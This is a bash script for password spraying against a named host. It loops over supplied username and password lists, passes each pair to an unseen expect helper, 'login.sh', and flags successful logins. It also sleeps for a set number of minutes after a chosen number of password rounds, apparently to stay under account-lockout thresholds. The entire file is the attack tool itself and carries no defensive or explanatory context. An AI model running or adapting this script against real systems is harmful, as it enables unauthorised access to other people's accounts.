#!/bin/bash

userfile=""
passfile=""
hostname=""
threshold=""
delay=""

usage() {
    echo "usage: $0 -u <userfile> -p <passfile> -h <hostname> -t <threshold> -d <delay>"
    echo "  userfile  -> list of usernames"
    echo "  passfile  -> list of passwords"
    echo "  hostname  -> target host"
    echo "  threshold -> number of guesses before sleeping"
    echo "  delay     -> number of minutes to sleep for"
    exit 1
}

while [ -n "$1" ]; do
    case "$1" in
        -u)
            shift; userfile="$1";;
        -p)
            shift; passfile="$1";;
        -h)
            shift; hostname="$1";;
        -t)
            shift; threshold="$1";;
        -d)
            shift; delay="$1";;
        *)
            echo "[!] invalid switch: $1"
            usage;;
    esac
    shift
done

[ -z "$userfile" -o -z "$passfile" ] && usage

sleeptime=$( expr $delay \* 60 )
count=0

cat $passfile | while read password; do
    cat $userfile | while read username; do
        expect -f login.sh $username $password $hostname | grep "Login"
    done
    let count=count+1
    if [ $( expr $count % $threshold ) -eq 0 ]; then
        echo "Sleeping for $delay before next cycle"
        sleep $sleeptime
    fi
done
